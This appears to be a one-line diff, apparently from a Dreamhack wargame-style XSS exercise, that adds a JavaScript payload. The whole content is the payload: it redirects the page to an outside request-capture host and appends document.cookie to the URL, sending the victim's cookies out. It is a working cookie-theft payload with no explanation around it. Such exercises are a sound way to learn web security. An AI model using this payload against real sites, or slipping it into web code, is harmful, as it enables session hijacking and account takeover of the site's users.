@@ -1,0 +1,1 @@
+location.href="https://cmjeuck.request.dreamhack.games?memo="+document.cookie;
